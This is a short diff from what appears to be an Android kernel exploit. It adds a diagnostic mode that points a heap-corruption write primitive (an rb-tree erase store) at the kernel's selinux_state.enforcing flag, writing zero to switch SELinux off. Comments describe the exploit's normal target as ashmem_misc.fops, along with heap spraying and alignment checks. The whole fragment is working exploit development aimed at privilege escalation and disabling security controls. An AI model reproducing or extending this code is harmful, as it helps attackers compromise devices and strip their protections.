@@ -380,6 +380,10 @@ uintptr_t canon_addr(uintptr_t image_addr) {
 }
 
 uintptr_t pselect_write_value(void) {
+  if (env_flag("ENFORCING_WRITE_DIAG", 0)) {
+    /* Bulletproof write-proof: value 0 -> zero selinux_state.enforcing. */
+    return 0;
+  }
   if (pselect_custom_write) {
     return pselect_custom_value;
   }
@@ -387,6 +391,14 @@ uintptr_t pselect_write_value(void) {
 }
 
 uintptr_t pselect_write_target(void) {
+  if (env_flag("ENFORCING_WRITE_DIAG", 0)) {
+    /* Write-proof diagnostic: aim the rb-erase store at &selinux_state.enforcing
+     * (vmlinux-verified addr) instead of &ashmem_misc.fops. Everything else on the
+     * walk path is IDENTICAL to the fops route, so a /sys/fs/selinux/enforce flip
+     * 1->0 proves the dequeue store executes; no flip => the walk provably never
+     * writes despite the proven-perfect shift=-2 alignment. */
+    return data_addr(SELINUX_ENFORCING);
+  }
   if (scratch_write_diag_enabled() && binwrite_target) {
     /* DIAGNOSTIC: aim the rb-erase write at a 0x41-filled scratch qword inside
      * the sprayed page instead of &ashmem_misc.fops, so scratch_diag_readback()
